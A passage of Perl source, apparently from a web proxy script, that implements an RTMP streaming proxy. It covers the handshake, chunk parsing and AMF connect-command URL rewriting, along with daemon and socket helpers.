    print $SS pack('N', int(tv_interval($t0_SS)*1000)), "\0\0\0\0", $local1528 ;

    # Read C2 (mostly echo of S1 ).
    my $c2= read_socket($SS, 1536) ;
    die "Bad RTMP handshake" unless substr($c2, 0, 4) eq "\0\0\0\0" and substr($c2, 8) eq $local1528 ;

    # Send S2 (mostly echo of C1).
    print $SS substr($c1, 0, 4), pack('N', $c1_read_t), substr($c1, 8) ;

    # RTMP handshake with client complete.

    # Use parent process to handle client-to-server communication, and child
    #   to handle server-to-client communication.  fork() is later, inside
    #   the chunk-handling while loop.  Not the most efficient and a bit hacky,
    #   but works for now.
    my($SC, $SR, $SW) ;     # client socket, reading socket, and writing socket.
    $SR= $SS ;

    # Next, read each chunk, proxify/unproxify messages if needed, and write
    #   to other side.

    my $chunk_size= 128 ;     # default
    my($win_ack_size, $peer_win_ack_size) ;      # default???
    my $received_bytes= 0 ;   # for Acknowledgement messages

    my($cin, $b1, $b2, $b3, $b23, $fmt, $csid, $cmh, $ts, $ext_ts,
       $msg_len, $msg_type, $msg_stream_id, $is_parent) ;
    my($c, $m)= ({}, {}) ;   # hashes of chunks and messages
    while (1) {

	# Read chunk basic header.
	$b1= ord(read_socket($SR, 1)) ;
	$cin= chr($b1) ;
	($fmt, $csid)= ($b1>>6, $b1&0x3f) ;
	if ($csid==0) {
	    $cin.= $b2= read_socket($SR, 1) ;
	    $csid= ord($b2) + 64 ;
	} elsif ($csid==1) {
	    $cin.= $b23= read_socket($SR, 2) ;
	    my($b2, $b3)= unpack('C2', $b23) ;
	    $csid= $b3*256 + $b2 + 64 ;
	}

	# Create chunk list if not already created.
	$c->{$csid}{chunks}= []  unless $c->{$csid}{chunks} ;

	# Read chunk message header (none for $fmt==3).
	if ($fmt==0) {
	    $cin.= $cmh= read_socket($SR, 11) ;
	    $ts= substr($cmh, 0, 3) ;
	    @{$c->{$csid}}{qw(mlen mtype msid)}=
		(unpack('N', "\0".substr($cmh, 3, 3)),
		 ord(substr($cmh, 6, 1)),
		 unpack('V', substr($cmh, 7)) ) ;
	} elsif ($fmt==1) {
	    $cin.= $cmh= read_socket($SR, 7) ;
	    $ts= substr($cmh, 0, 3) ;
	    @{$c->{$csid}}{qw(mlen mtype)}=
		(unpack('N', "\0".substr($cmh, 3, 3)),
		 ord(substr($cmh, 6)) ) ;
	} elsif ($fmt==2) {
	    $cin.= $ts= $cmh= read_socket($SR, 3) ;
	}
	my $msid= $c->{$csid}{msid} ;

	# To multiplex messages within one chunk stream, must save mleft for
	#   each message stream.
	$c->{$csid}{mleft}{$msid}= $c->{$csid}{mlen}  unless defined $m->{$msid}{type} ;

	# Read extended timestamp, if needed.
	if ($ts eq "\xff\xff\xff") {
	    # Extended timestamp seems to be uint32, though is undocumented.
	    $cin.= $ext_ts= read_socket($SR, 4) ;
	}


	# Done reading chunk header; next, read data into message buffer or
	#   message payload.

	my $cpayload= read_socket($SR, $c->{$csid}{mleft}{$msid} <= $chunk_size
				     ? $c->{$csid}{mleft}{$msid}  : $chunk_size ) ;
	$cin.= $cpayload ;
	$c->{$csid}{mleft}{$msid}-= length($cpayload) ;
	$m->{$msid}{complete}= 1  if $c->{$csid}{mleft}{$msid}==0 ;

	# Send acknowledgement if needed.
	# jsm-- can we count on getting complete chunks?
	$received_bytes+= length($cin) ;
	if ($received_bytes>=$win_ack_size) {
	    send_acknowledgement($SR, $received_bytes, $t0_SS) ;
	    $received_bytes= 0 ;    # jsm-- do we send total bytes or bytes since last ack?
	}

	# End processing and print chunk if passthru.
	print $SW ($cin), next  if $m->{$msid}{passthru} ;

	if (!defined $m->{$msid}{type}) {
	    $m->{$msid}{mbuf}.= $cpayload ;
	} else {
	    $m->{$msid}{payload}.= $cpayload ;
	}

	# Save complete chunks, in case we just need a pass-through.
	push(@{$c->{$csid}{chunks}}, $cin) ;

	# Initialize $m element if we have full message header.
	if (!defined $m->{$msid}{type} and length($m->{$msid}{mbuf})>=11) {
	    @{$m->{$msid}}{qw(type len ts msid payload)}=
		(unpack('C', substr($m->{$msid}{mbuf}, 0, 1)),
		 unpack('N', "\0".substr($m->{$msid}{mbuf}, 1, 3)),
		 unpack('N', substr($m->{$msid}{mbuf}, 4, 4)),
		 unpack('N', "\0".substr($m->{$msid}{mbuf}, 8, 3)),
		 substr($m->{$msid}{mbuf}, 11) ) ;
	    delete $m->{$msid}{mbuf} ;
	}

	# Chunk stream ID==2 means a protocol control message.
	if ($csid==2) {

	    # Require a complete message to process protocol control messages.
	    if ($m->{$msid}{complete}) {
		die("Invalid message stream ID [$msid] in RTMP stream") unless $msid==0 ;
		my($mtype, $payload)= @{$m->{0}}{qw(type payload)} ;

		# Set chunk size
		if ($mtype==1) {
		    $chunk_size= unpack('N', $payload) ;

		# Abort message
		} elsif ($mtype==2) {
		    delete $m->{$c->{unpack('N', $payload)}{msid}} ;
		    # jsm-- need to delete part of %$c too?

		# Acknowledgement
		} elsif ($mtype==3) {
		    my $seqno= unpack('N', $payload) ;

		# User control message can pass through
		} elsif ($mtype==4) {
		    if (defined $SW) {
			print $SW @{$c->{2}{chunks}} ;
			$c->{2}{chunks}= [] ;
		    }

		# Window acknowledgement size
		# Done by server after successful connect request from client,
		#   or by either after receiving Set Peer Bandwidth message.
		# Must handle this separately for client and server, since we change data length.
		# Pass through these messages, since window size should be similar
		#   for both connections.
		} elsif ($mtype==5) {
		    $win_ack_size= unpack('N', $payload) ;
		    if (defined $SW) {
			print $SW @{$c->{2}{chunks}} ;
			$c->{2}{chunks}= [] ;
		    }

		# Set peer bandwidth
		# Pass through these messages, since window size should be similar
		#   for both connections.
		} elsif ($mtype==6) {
		    my($new_peer_was, $limit_type)=
			(unpack('N', substr($payload, 0, 4)),
			 unpack('C', substr($payload, 4)) ) ;
		    if ($new_peer_was!=$peer_win_ack_size) {
			$peer_win_ack_size= $new_peer_was ;
			send_win_ack_size($SR, $peer_win_ack_size, $is_parent ? $t0_SC : $t0_SS) ;
		    }
		    if (defined $SW) {
			print $SW @{$c->{2}{chunks}} ;
			$c->{2}{chunks}= [] ;
		    }

		} else {
		    die("Illegal PCM message type [$mtype] in RTMP stream") ;
		}

		delete $m->{0} ;
		delete $c->{2} ;
	    }


	# Otherwise, handle message piece depending on its type.  All are just
	#   pass-through except command messages, and possibly a submessage
	#   within an aggregate message.
	} else {
	    my $mtype= $m->{$msid}{type} ;

	    # Command message using AMF0 or AMF3
	    if ($mtype==20 or $mtype==17) {
		if ($m->{$msid}{complete}) {
		    ($host, $port)= ('', '') ;   # hacky
		    # Note use of $reverse parameter, true when client-to-server.
		    my $newmpl= ($mtype==20) ? proxify_RTMP_command_AMF0(\$m->{$msid}{payload}, $is_parent)
					     : proxify_RTMP_command_AMF3(\$m->{$msid}{payload}, $is_parent) ;
		    if (defined $newmpl) {

			# If $host set and in parent process, then connect to
			#   the destination server and do the handshake.
			# This is hacky, but we can only start the server connection
			#   after we've started processing messages from the client.
			if ($host and !defined $SC) {
			    $SC= rtmp_connect_to($host, $port) ;
			    $t0_SC= [gettimeofday] ;
			    $is_parent= fork() ;
			    ($SR, $SW)= $is_parent  ? ($SS, $SC)  : ($SC, $SS) ;
			    ($c, $m)= ({}, {}), next unless $is_parent ;  # restart loop if new child
			}

			my($newcbh, $newcmh0, $i) ;
			my $newm= chr($mtype)
				. substr(pack('N', length($newmpl)), 1, 3)
				. pack('N', $m->{$msid}{ts})
				. substr(pack('N', $msid), 1, 3)
				. $newmpl ;

			# Build chunk basic header.
			if ($csid<=63) {
			    $newcbh= chr($csid) ;
			} elsif ($csid<=319) {
			    $newcbh= "\0" . chr($csid-64) ;
			} else {
			    $newcbh= "\x01" . chr(($csid-64) & 0xff) . chr(($csid-64)>>8) ;
			}

			# Build chunk message header, possibly including extended timestamp.
			$newcmh0= $ts
				. substr(pack('N', length($newm)), 1, 3)
				. chr($mtype)
				. pack('V', $msid) ;
			$newcmh0.= $ext_ts if $ts eq "\xff\xff\xff" ;
			
			# Print new chunk(s) from $newm, a 0-type followed by 3-types.
			print $SW $newcbh, $newcmh0, substr($newm, 0, $chunk_size) ;
			substr($newcbh, 0, 1)||= "\xc0" ;   # set chunk fmt to 3 henceforth
			print $SW $newcbh, substr($newm, $_*$chunk_size, $chunk_size)
			    for 1..int((length($newm)-1)/$chunk_size) ;
			# Perl doesn't like line below....
			#   for ($i= $chunk_size ; $i<length($newm) ; $i+= $chunk_size) ;

		    # If new message payload is unchanged, then pass through chunks.
		    } elsif (defined $SW) {
			print $SW @{$c->{$csid}{chunks}} ;
			$c->{$csid}{chunks}= [] ;
		    }
		    delete $m->{$msid} ;
		}

	    # Aggregate message
	    } elsif ($mtype==22) {
		# jsm-- must implement

	    # Data message using AMF0 or AMF3, shared object message using
	    #   AMF0 or AMF3, audio message, or video message
	    } elsif (chr($mtype)=~ /[\x12\x0f\x13\x10\x08\x09]/) {
		print $SW @{$c->{$csid}{chunks}} ;
		$c->{$csid}{chunks}= [] ;
		$m->{$msid}{passthru}= 1 ;

	    } else {
		die("Illegal message type [$mtype] in RTMP stream") ;
	    }
	}
    }

    exit(0) ;
}   # rtmp_proxy



# Open an RTMP connection to the given host and port, and perform the handshake.
# Returns the open socket.
sub rtmp_connect_to {
    my($host, $port)= @_ ;
    $port= 1935  if $port eq '' ;
    my $S ;   # filehandle for socket

    &newsocketto($S, $host, $port) ;

    # Send C0 and C1 chunks.
    print $S "\x03" ;     # C0 is RTMP version

    # C1 is timestamp, zero, and 1528 bytes of random data.
    my $local1528= join('', map {chr(int(rand 256))} 1..1528) ;
    my $t0= [gettimeofday] ;
    print $S "\0\0\0\0\0\0\0\0", $local1528 ;

    # Read S0 and S1 chunks.
    my $s0s1= read_socket($S, 1537) ;
    my $s0s1_time= pack('N', int(tv_interval($t0)*1000)) ;
    my $remote1528= substr($s0s1, 9) ;

    # Send C2 chunk.
    print $S substr($s0s1, 1, 4), $s0s1_time, $remote1528 ;

    # Read S2 chunk.
    my $s2= read_socket($S, 1536) ;
    die "Bad RTMP handshake" unless $local1528 eq substr($s2, 8) ;

    return $S ;
}


sub send_win_ack_size {
    my($S, $win_ack_size, $t0)= @_ ;

    my $ts= int(tv_interval($t0)*1000) ;
    my $ext_ts ;

    my $msg= "\x05\0\0\x04" . pack('N', $ts) . "\0\0\0" . pack('N', $win_ack_size) ;

    if ($ts>=0xffffff) {
	$ext_ts= pack('N', $ts-0xffffff) ;
	$ts= "\xff\xff\xff" ;
    } else {
	$ts= substr(pack('N', $ts), 1, 3) ;
	$ext_ts= '' ;
    }
    print $S "\x02" . $ts . "\0\0\x0f\x05\0\0\0\0" . $ext_ts . $msg ;   # chunk header plus message
}


# Identical to send_win_ack_size() except for message type byte (in two places).
sub send_acknowledgement {
    my($S, $seqno, $t0)= @_ ;

    my $ts= int(tv_interval($t0)*1000) ;
    my $ext_ts ;

    my $msg= "\x03\0\0\x04" . pack('N', $ts) . "\0\0\0" . pack('N', $seqno) ;

    if ($ts>=0xffffff) {
	$ext_ts= pack('N', $ts-0xffffff) ;
	$ts= "\xff\xff\xff" ;
    } else {
	$ts= substr(pack('N', $ts), 1, 3) ;
	$ext_ts= '' ;
    }
    print $S "\x02" . $ts . "\0\0\x0f\x03\0\0\0\0" . $ext_ts . $msg ;   # chunk header plus message
}

sub proxify_RTMP_command_AMF0 {
    my($in, $reverse)= @_ ;
    my(@out, $len, $segstart, $tcUrl_orig, $appvalpos) ;

    # Proxify connect command, and nothing else.
    return unless $$in=~ /\G\x02\0\x07connect\0\x3f\xf0\0\0\0\0\0\0\x03/gc ;

    while ($$in=~ /G(..)/gcs && ($len= unpack('n', $1))) {
	my $name= get_next_substring($in, $len) ;
	# would normally UTF-decode name, but we're only worried about ASCII values
	if ($name=~ /^(?:app|swfUrl|tcUrl|pageUrl)$/) {
	    push(@out, substr($in, $segstart, pos($$in)-$segstart)) ;
	    $$in=~ /\G\x02(..)/gcs or die "connect.$name has wrong AMF0 type" ;
	    my $value= get_next_substring($in, unpack('n', $1)) ;
	    $tcUrl_orig= $value  if $name eq 'tcUrl' ;
	    $value= proxify_RTMP_value($name, $value, $reverse) ;
	    $appvalpos= @out  if $name eq 'app' ;
	    push(@out, "\x02" . pack('n', length($value)) . $value) ;  # must be one element
	    $segstart= pos($$in) ;
	} else {
	    skip_value_AMF0($in) ;
	}
    }

    # After all the others, proxify app value.  Not needed when unproxifying.
    if (!$reverse and $tcUrl_orig ne '' and $appvalpos ne '') {
	my $papp= proxify_RTMP_value('app', undef, $reverse, $tcUrl_orig) ;
	splice(@out, $appvalpos, 1, "\x02" . pack('n', length($papp)) . $papp) ;
    }

    # As part of fork() hack in rtmp_proxy(), set $host and $port here.
    ($host, $port)= $tcUrl_orig=~ m#rtmp://([^/:])(?::([^/]))?#i
	if $reverse and $tcUrl_orig ne '' ;

    die "no AMF0 object end marker" unless $$in=~ /\G\x09$/ ;

    return unless @out ;     # i.e. command is unchanged
    push(@out, substr($in, $segstart)) ;
    return join('', @out) ;
}


sub proxify_RTMP_command_AMF3 {
    my($in, $reverse)= @_ ;
    my(@out, $segstart, @srefs, $tcUrl_orig, $appvalpos) ;

    # Proxify connect command, and nothing else.
    # jsm-- what if non-canonical U29 values are used?  Or string reference?
    if ($$in=~ /\G\x06\x47connect\x04\x01\x0a([\x60-\x6f\xe0-\xef])/gc) {
	my($class_name, $byte1, $name, $value, $flag, $u28) ;
	$byte1= ord($1) ;

	# Traits
	# These apparently include a regular array of sealed trait member
	#   names as well as an associative array of dynamic members.  Store
	#   it all in one hash, like the Array type.
	# jsm-- what is the difference between an object and a set of traits?
	my $is_dynamic= ($byte1 & 0x08)!=0 ;
	my $tcount= get_Uxx($in, 4, $byte1) ;
	for (1..$tcount) {
	    ($flag, $u28)= get_flag_U28($in) ;
	    pos($$in)+= $u28  if $flag ;    # skip string if it's not a reference
	    # jsm-- could sealed traits hold values we want to proxify?
	}
	skip_value_AMF3($in) for 1..$tcount ;
	if ($is_dynamic) {
	    do {
		($flag, $u28)= get_flag_U28($in) ;
		$name= $flag  ? get_next_substring($in, $u28)  : $srefs[$u28] ;
		if ($name=~ /^(?:app|swfUrl|tcUrl|pageUrl)$/) {
		    $$in=~ /\G\x06/  or die "connect.$name has wrong AMF3 type" ;
		    push(@out, substr($in, $segstart, pos($$in)-$segstart)) ;
		    ($flag, $u28)= get_flag_U28($in) ;
		    $value= $flag  ? get_next_substring($in, $u28)  : $srefs[$u28] ;
		    $tcUrl_orig= $value  if $name eq 'tcUrl' ;
		    $value= proxify_RTMP_value($name, $value, $reverse) ;
		    $appvalpos= @out  if $name eq 'app' ;
		    push(@out, U28(length($value)) . $value) ;  # must be one element
		    $segstart= pos($$in) ;
		} else {
		    skip_value_AMF3($in) ;
		}
	    } until $name eq '' ;
	}

	# After all the others, proxify app value.  Not needed when unproxifying.
	if (!$reverse) {
	    my $papp= proxify_RTMP_value('app', undef, $reverse, $tcUrl_orig) ;
	    splice(@out, $appvalpos, 1, U28(length($papp)) . $papp) ;
	}

	return unless @out ;     # i.e. command is unchanged
	push(@out, substr($in, $segstart)) ;
	return join('', @out) ;
    } else {
	return ;
    }
}


sub proxify_RTMP_value {
    my($name, $value, $reverse, $tcUrl_orig)= @_ ;
    if ($reverse) {
	if ($name eq 'app') {
	    $value=~ s/%(..)/chr(hex($1))/ge ;
	    $value=~ m#^[^/]*/(.*)#s ;
	    return $1 ;
	} elsif ($name eq 'swfUrl') {
	    $value=~ s#^\Q$THIS_SCRIPT_URL/[^/]*/## ;   # jsm-- doesn't work with @PROXY_GROUP
	    return wrap_proxy_decode($value) ;
	} elsif ($name eq 'tcUrl') {
	    my($app, $instance)= $value=~ m#^rtmp://[^/]*/([^/]*)/(.*)#is ;
	    $app=~ s/%(..)/chr(hex($1))/ge ;
	    return "rtmp://$app/$instance" ;
	} elsif ($name eq 'pageUrl') {
	    $value=~ s#^\Q$THIS_SCRIPT_URL/[^/]*/## ;   # jsm-- doesn't work with @PROXY_GROUP
	    return wrap_proxy_decode($value) ;
	}
    } else {
	if ($name eq 'app') {
	    return $value unless $tcUrl_orig ;   # skip proxifying until later-- part of hack
	    my($papp)= $tcUrl_orig=~ m#rtmp://([^/]*/[^/]*)/#i ;
	    die "invalid tcUrl value '$value' (doesn't support http:// URLs yet)" unless defined $papp ;
	    $papp=~ s/([^\w.-])/ '%' . sprintf('%02x',ord($1)) /ge ;
	    return $papp ;
	} elsif ($name eq 'swfUrl') {
	    return full_url($value) ;
	} elsif ($name eq 'tcUrl') {
	    my($papp, $instance)= $value=~ m#^rtmp://([^/]*/[^/]*)/(.*)#is ;
	    die "invalid tcUrl value '$value' (doesn't support http:// URLs yet)" unless defined $papp ;
	    $papp=~ s/([^\w.-])/ '%' . sprintf('%02x',ord($1)) /ge ;
	    my $portst= $RTMP_SERVER_PORT==1935  ? ''  : ':'.$RTMP_SERVER_PORT ;
	    return "rtmp://$THIS_HOST$portst/$papp/$instance" ;
	} elsif ($name eq 'pageUrl') {
	    return full_url($value) ;
	}
    }
    die "proxify_RTMP_value() called for '$name'" ;
}


# Convenience function to get substr() and advance pos().
sub get_next_substring {
    my($in, $len)= @_ ;
    my $ret= substr($$in, pos($$in), $len) ;
    pos($$in)+= $len ;
    return $ret ;
}


# Get a U29 value from $$in.  U29 values are 1-4 bytes, have first bit set on
#   all bytes but the last, and each byte contributes 7 bits to the value,
#   except the possible fourth byte which contributes all 8 bits.
sub get_U29 {
    my($in)= @_ ;
    $$in=~ /\G([\x80-\xff]{0,3})(.)/gcs ;
    return ord($2) unless $1 ;            # shortcut for most common case
    my($last, @in)= ($2, split(//, $1)) ;
    my $ret= 0 ;
    $ret= ($ret<<7) + (ord($_)&0x7f) foreach @in ;
    return +($ret<<8) + ord($last) ;
}


# Like get_U29, but skip the first $skip_bits of the first byte.
# Include optional leading byte $byte1, if it's been read.
sub get_Uxx {
    my($in, $skip_bits, $byte1)= @_ ;

    $$in=~ /\G(.)/gcs, $byte1= ord($1)  unless defined $byte1 ;
    my $ret= $byte1 & ((1<<(7-$skip_bits))-1) ;
    return $ret unless $byte1 & 0x80 ;
    $$in=~ /\G([\x80-\xff]{0,2})(.)/gcs ;
    my($last, @in)= ($2, split(//, $1)) ;
    $ret= 0 ;
    $ret= ($ret<<7) + (ord($_)&0x7f) foreach @in ;
    return +($ret<<8) + ord($last) ;
}


# Get a U29 value from $$in, and split it into a 1-bit flag in front followed
#   by a U28.  Returns (flag, U28).
sub get_flag_U28 {
    my($in)= @_ ;
    $$in=~ /\G([\x80-\xff]{0,3})(.)/gcs ;
    return (ord($2) & 0x40, ord($2) & 0x3f)  unless $1 ;   # most common case
    my($last, @in)= (ord($2), map {ord} split(//, $1)) ;
    my($flag, $ret)= ($in[0]&0x40, $in[0]&0x3f) ;
    shift(@in) ;
    $ret= ($ret<<7) + ($_&0x7f) foreach @in ;
    return ($flag, ($ret<<8) + $last) ;
}


sub U29 {
    my($value)= @_ ;
    return chr($value)
	if $value <= 0x7f ;
    return chr(($value>>7) | 0x80) . chr($value & 0x7f)
	if $value <= 0x3fff ;
    return chr(($value>>14) | 0x80) . chr((($value>>7) & 0x7f) | 0x80)
	   . chr($value & 0x7f)
	if $value <= 0x1fffff ;
    return chr(($value>>22) | 0x80) . chr((($value>>15) & 0x7f) | 0x80)
	   . chr((($value>>8) & 0x7f) | 0x80) . chr($value & 0xff) ;
}

# This assumes a 1st bit of 1 (e.g. indicating a string literal, not a reference).
sub U28 {
    my($value)= @_ ;
    return chr($value | 0x40)
	if $value <= 0x3f ;
    return chr(($value>>7) | 0xc0) . chr($value & 0x7f)
	if $value <= 0x1fff ;
    return chr(($value>>14) | 0xc0) . chr((($value>>7) & 0x7f) | 0x80)
	   . chr($value & 0x7f)
	if $value <= 0xfffff ;
    return chr(($value>>22) | 0xc0) . chr((($value>>15) & 0x7f) | 0x80)
	   . chr((($value>>8) & 0x7f) | 0x80) . chr($value & 0xff) ;
}



# Skip past an AMF0 value in $in.  No return value.
sub skip_value_AMF0 {
    my($in)= @_ ;

    $$in=~ /\G(.)/gcs ;
    my $marker= ord($1) ;

    # Number
    if ($marker==0) {
	pos($$in)+= 8 ;

    # String
    } elsif ($marker==2) {
	$$in=~ /\G(..)/gcs ;
	pos($$in)+= unpack('n', $1) ;

    # Object
    } elsif ($marker==3) {
	while ($$in=~ /\G(..)/gcs) {
	    pos($$in)+= unpack('n', $1) ;
	    skip_value_AMF0($in) ;
	}
	die "no AMF0 object end marker" unless $$in=~ /\G\x09/gc ;

    # Reference
    } elsif ($marker==7) {
	pos($$in)+= 2 ;

    # ECMA array
    } elsif ($marker==8) {
	pos($$in)+= 4 ;
	while ($$in=~ /\G(..)/gcs) {
	    pos($$in)+= unpack('n', $1) ;
	    skip_value_AMF0($in) ;
	}
	die "no AMF0 object end marker" unless $$in=~ /\G\x09/gc ;

    # Object end
    # These should only happen as part of another value, so ignore here.
    #} elsif ($marker==9) {

    # Strict Array
    } elsif ($marker==0x0a) {
	$$in=~ /\G(....)/gcs ;
	skip_value_AMF0($in) for 1..unpack('N', $1) ;

    # Date
    } elsif ($marker==0x0b) {
	pos($$in)+= 10 ;

    # Long String
    } elsif ($marker==0x0c) {
	$$in=~ /\G(....)/gcs ;
	pos($$in)+= unpack('N', $1) ;

    # XML document
    } elsif ($marker==0x0f) {
	$$in=~ /\G(....)/gcs ;
	pos($$in)+= unpack('N', $1) ;

    # Typed object
    } elsif ($marker==0x10) {
	$$in=~ /\G(..)/gcs ;
	pos($$in)+= unpack('n', $1) ;
	while ($$in=~ /\G(..)/gcs) {
	    pos($$in)+= unpack('n', $1) ;
	    skip_value_AMF0($in) ;
	}
	die "no AMF0 object end marker" unless $$in=~ /\G\x09/gc ;

    # AVMplus object, i.e. use AMF3
    } elsif ($marker==0x11) {
	skip_value_AMF3($in) ;

    # all other types are either 0-length or unsupported.

    } elsif ($marker>0x11) {
	die "unrecognized AVM0 marker: [$marker]" ;
    }
}


# Skip past an AMF3 value in $in.  No return value.
sub skip_value_AMF3 {
    my($in)= @_ ;
    my($flag, $u28) ;

    $$in=~ /\G(.)/gcs ;
    my $marker= ord($1) ;

    # Integer
    if ($marker==4) {
	$$in=~ /\G([\x80-\xff]{0,3})(.)/gcs ;

    # Double
    } elsif ($marker==5) {
	pos($$in)+= 8 ;

    # String
    } elsif ($marker==6) {
	($flag, $u28)= get_flag_U28($in) ;
	pos($$in)+= $u28 if $flag ;

    # XMLDocument
    } elsif ($marker==7) {
	($flag, $u28)= get_flag_U28($in) ;
	pos($$in)+= $u28 if $flag ;

    # Date
    } elsif ($marker==8) {
	($flag)= get_flag_U28($in) ;
	pos($$in)+= 8 if $flag ;

    # Array
    } elsif ($marker==9) {
	($flag, $u28)= get_flag_U28($in) ;
	if ($flag) {
	    # First, skip associative array.
	    while (!$$in=~ /\G\x01/gc) {
		($flag, $u28)= get_flag_U28($in) ;
		pos($$in)+= $u28 if $flag ;
		skip_value_AMF3($in) ;
	    }
	    # Then, skip normal array, sized by first $u28.
	    skip_value_AMF3($in) for 1..$u28 ;
	}

    # Object
    } elsif ($marker==0x0a) {
	$$in=~ /\G(.)/gcs ;
	my $byte1= ord($1) ;
	pos($$in)-- ;

	# Object reference
	if (($byte1 & 0x40)==0) {
	    $$in=~ /\G([\x80-\xff]{0,3})(.)/gcs ;
	# Trait reference
	} elsif (($byte1 & 0x20)==0) {
	    $$in=~ /\G([\x80-\xff]{0,3})(.)/gcs ;
	# Traits
	# These apparently include a regular array of sealed trait member
	#   names as well as an associative array of dynamic members.  Store
	#   it all in one hash, like the Array type.
	# jsm-- what is the difference between an object and a set of traits?
	} elsif (($byte1 & 0x10)==0) {
	    my $is_dynamic= ($byte1 & 0x08)!=0 ;
	    my $tcount= get_Uxx($in, 4) ;
	    ($flag, $u28)= get_flag_U28($in) ;
	    pos($$in)+= $u28 if $flag ;
	    for (1..$tcount) {
		($flag, $u28)= get_flag_U28($in) ;
		pos($$in)+= $u28 if $flag ;
	    }
	    skip_value_AMF3($in) for 1..$tcount ;
	    if ($is_dynamic) {
		do {
		    ($flag, $u28)= get_flag_U28($in) ;
		    pos($$in)+= $u28 if $flag ;
		    skip_value_AMF3($in) unless $u28==0 ;
		} until $u28==0 ;   # jsm-- is this right?  Spec says 0x01....
	    }

	# Externalizable trait (not supported; handled by client/server agreement)
	} elsif (($byte1 & 0x10)!=0) {
	    die "externalizable trait not supported" ;
	}


    # XML
    } elsif ($marker==0x0b) {
	my($flag, $u28)= get_flag_U28($in) ;
	pos($$in)+= $u28 if $flag ;

    # ByteArray
    } elsif ($marker==0x0c) {
	my($flag, $u28)= get_flag_U28($in) ;
	pos($$in)+= $u28 if $flag ;

    # all other types are either 0-length or unsupported.

    } elsif ($marker>0x11) {
	die "unrecognized AVM0 marker: [$marker]" ;
    }
}


sub spawn_generic_server {
    my($LISTEN, $LOCK_FH, $coderef, $timeout, @args)= @_ ;

    my $new_pid= double_fork_daemon($LOCK_FH, $LISTEN) ;
    return $new_pid  if $new_pid ;

    my $port= (unpack_sockaddr_in(getsockname($LISTEN)))[0] ;   # get the port bound to

    # Record port and PID in lockfile.
    select((select($LOCK_FH), $|=1)[0]) ;   # make $LOCK_FH autoflush output
    seek($LOCK_FH, 0, 0) ;
    print $LOCK_FH "$port,$$\n" ;

    # Clear permissions mask, for easier file-handling.
    umask 0 ;

    $SIG{CHLD} = \&REAPER;

    # Daemon dies if not used for $timeout seconds.
    $SIG{ALRM}= sub {exit} ;
    eval { alarm($timeout) } ;   # use eval{} to avoid failing where alarm() is missing

    # jsm-- should allow stopping process via x-proxy://admin/stop-daemon ?
    my $paddr ;
    while (1) {
	my($SS) ;
	$paddr= accept($SS, $LISTEN) ;
	next if !$paddr and $!==EINTR ;
	die "failed accept: $!"  unless $paddr ;

	# Restart timer upon each incoming connection.
	eval { alarm($timeout) } ;   # use eval{} to avoid failing where alarm() is missing

	my $pid= fork() ;
	die "failed fork: $!"  unless defined($pid) ;
	close($SS), next if $pid ;   # parent daemon process

	# After here is the per-connection process.

	# Processes handling connections don't have a timeout.
	eval { alarm(0) } ;   # use eval{} to avoid failing where alarm() is missing

	# They also shouldn't hold the lock.
	close($LOCK_FH) ;

	exit(&$coderef($SS, $port, @args)) ;
    }


    # Kill zombie children spawned by the daemon's fork.
    sub REAPER {
	local $! ;
	1 while waitpid(-1, WNOHANG)>0 and WIFEXITED($?) ;
	$SIG{CHLD} = \&REAPER;
    }

}


sub create_server_lock {
    my($lock_file)= @_ ;
    my($LOCK) ;

    # First, open and get lock on $lock_file, to avoid duplicates daemons.
    die "illegal lock_file name: [$lock_file]"
	if $lock_file=~ /\.\./ or $lock_file=~ m#^/# or $lock_file=~ /[^\w.-]/
	    or $lock_file eq '.' or $lock_file eq '' ;
    -d $PROXY_DIR or mkdir($PROXY_DIR, 0755) or die "mkdir [$PROXY_DIR]: $!" ;
    open($LOCK, (-s "$PROXY_DIR/$lock_file"  ? '+<'  : '+>'), "$PROXY_DIR/$lock_file") || die "open: $!" ;
    if (!flock($LOCK, LOCK_EX|LOCK_NB)) {    # daemon already started
	my($port, $pid)= ((scalar <$LOCK>)=~ /(\d+)/g) ;
	close($LOCK) ;
	return (undef, $port, $pid) ;
    }

    return ($LOCK) ;
}

sub new_server_socket {
    my($port)= @_ ;

    # Create and listen on server socket.
    # IPv6 support in Socket started with version 1.94 .
    my($LISTEN, $err, $addr) ;
    if ($Socket::VERSION>=1.94) {
	($err, $addr)= getaddrinfo(undef, $port, { flags => AI_PASSIVE(), socktype => SOCK_STREAM }) ;
	socket($LISTEN, $addr->{family}, SOCK_STREAM, scalar getprotobyname('tcp'))
	    or &HTMLdie("Can't create socket: $!") ;
	setsockopt($LISTEN, SOL_SOCKET, SO_REUSEADDR, 1)
	    or &HTMLdie("Can't setsockopt: $!") ;
	eval {   # needed to avoid compile errors below with old Socket modules
	    bind($LISTEN, $addr->{addr})
		or bind($LISTEN, (($addr->{family}==AF_INET)   ? pack_sockaddr_in(0, INADDR_ANY)
				: ($addr->{family}==AF_INET6())  ? pack_sockaddr_in6(0, IN6ADDR_ANY())
				: undef))
		or die "bind: $!" ;
	} ;
	($err, undef, $port)= getnameinfo(getsockname($LISTEN), NI_NUMERICSERV(), NIx_NOHOST()) ;

    # Older version of Socket, no IPv6.
    } else {
	eval {
	    socket($LISTEN, AF_INET, SOCK_STREAM, scalar getprotobyname('tcp'))
		or &HTMLdie("Can't create socket: $!") ;
	    setsockopt($LISTEN, SOL_SOCKET, SO_REUSEADDR, 1)
		or &HTMLdie("Can't setsockopt: $!") ;
	    bind($LISTEN, pack_sockaddr_in($port, INADDR_ANY))
		or bind($LISTEN, pack_sockaddr_in(0, INADDR_ANY))
		or &HTMLdie("Can't bind server socket: $!") ;
	    ($port)= unpack_sockaddr_in(getsockname($LISTEN)) ;
	} ;
	return () if $@ ;
    }

    listen($LISTEN, SOMAXCONN) or die "listen: $!" ;

    return ($LISTEN, $port) ;
}


# Double-forks a daemon process.  Returns the resulting PID in the parent,
#   or 0 in the resulting grandchild daemon.
sub double_fork_daemon {
    my($LOCK_FH, $LISTEN)= @_ ;

    # Open pipe to communicate PID back to caller.
    my($PIPE_P, $PIPE_C) ;
    pipe($PIPE_P, $PIPE_C) ;

    # First fork...
    my $pid= fork() ; 
    die "fork: $!"  unless defined($pid) ;

    # First parent process returns.
    if ($pid) {
	close($PIPE_C) ;
	close($LISTEN) ;
	close($LOCK_FH) if $LOCK_FH ;
	my $finalpid= <$PIPE_P> ;
	close($PIPE_P) ;
	return $finalpid ;
    }

    # Child process continues.

    close($PIPE_P) ;

    # Close filehandles in child process.
    close(S) ;         # in case it's open from somewhere

    # This is required for a daemon, to disconnect from controlling terminal
    #   and current process group.
